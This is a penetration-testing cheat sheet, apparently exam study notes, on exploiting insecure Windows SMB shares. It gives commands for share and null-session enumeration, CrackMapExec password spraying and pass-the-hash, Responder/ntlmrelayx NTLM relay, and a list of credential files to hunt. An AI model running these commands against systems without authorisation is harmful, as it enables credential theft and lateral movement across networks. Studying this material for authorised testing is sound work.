# 🛰️ Insecure File Shares

> [!ABSTRACT] Overview of Insecure File Shares
>
> This note covers common vulnerabilities and exploitation techniques related to insecurely configured file shares on Windows systems.

---

## 🔍 Initial Enumeration

### Nmap

```bash
sudo nmap -sC -sV -p139,445 <IP>
```

Aggressive SMB Enumeration:

```bash
sudo nmap --script smb* -p445 <IP>
```

> [!NOTE] 
> Use `nmap` to quickly check for open SMB ports and services.

---

## 📂 Important SMB Shares

| Share | Purpose |
|---|---|
| `C$`  | Entire C Drive |
| `ADMIN$`   | Windows Directory |
| `IPC$`     | RPC Communication |
| `NETLOGON` | Domain Logon Scripts |
| `SYSVOL`   | Domain Policies |

---

## SMB Shares

### smbclient

Anonymous:

```bash
smbclient -N -L //<IP>
```

Authenticated:

```bash
smbclient -L //<IP> -U user
```

Access Share:

```bash
smbclient //<IP>/share -U user
```

---

# 👤 Null Session Enumeration

Anonymous RPC:

```bash
rpcclient -U'%' <IP>
```

Useful Commands:

```bash
enumdomusers
enumdomgroups
queryuser RID
querygroup RID
getdompwinfo
srvinfo
```

> [!SUCCESS] 
> Use `rpcclient` for basic user enumeration.

---

# 🔑 Password Spraying

### CrackMapExec

Local Accounts:

```bash
crackmapexec smb <IP> \
-u users.txt \
-p 'Password123!' \
--local-auth
```

Domain Accounts:

```bash
crackmapexec smb <IP> \
-u users.txt \
-p 'Password123!'
```

---

# 🎭 Pass-the-Hash (PtH)

Authenticate Using NTLM Hash:

```bash
crackmapexec smb <IP> \
-u Administrator \
-H NTHASH
```

Requirements:

```text
Username
NTLM Hash
Admin Rights
```
> [!NOTE]
> No plaintext password is needed for this attack.

---

# 🧨 NTLM Relay

Capture Hashes:

```bash
sudo responder -I tun0
```

Relay Hashes:

```bash
impacket-ntlmrelayx \
-smb2support \
-t smb://<TARGET>
```

> [!DANGER]
> This requires SMB Signing to be **Disabled** on the target.

---

# 📌 High-Value Files to Hunt

```text
passwords.txt
creds.txt
backup.zip
KeePass (.kdbx)
web.config
groups.xml
id_rsa
config.php
database.yml
.vpn
```

Also search for keywords: `password`, `passwd`, `secret`, `token`, `key`, `credential`, `backup`.

---

# ⚠️ Common Findings

| Finding | Impact |
|---|---|
| Null Session | User Enumeration |
| Guest Access | Data Exposure |
| Writable Share | Malware Drop / Lateral Movement |
| Local Admin Credentials | SYSTEM Shell |
| NTLM Hashes | Pass-the-Hash |
| SMB Signing Disabled | NTLM Relay |

---

# 🧠 Exam Mental Model

```text
SMB Open
 ├─ Shares?
 │   ├─ Read? → Download Everything
 │   └─ Write? → Upload Payloads
 ├─ Null Session? → Enumerate Users
 ├─ Credentials? → CME Enumeration
 ├─ Admin? → PsExec / SMBExec / WMIExec
 └─ Hashes? → Pass-the-Hash
```

> [!SUCCESS] 
> **Whenever you see port 445 open, immediately think:**
>
> ```text
> Shares → Users → Password Policy → Credentials → Admin Access → Lateral Movement
> ```
> Most AD compromises eventually involve SMB. It is the primary protocol for enumeration, credential validation, lateral movement, and remote command execution.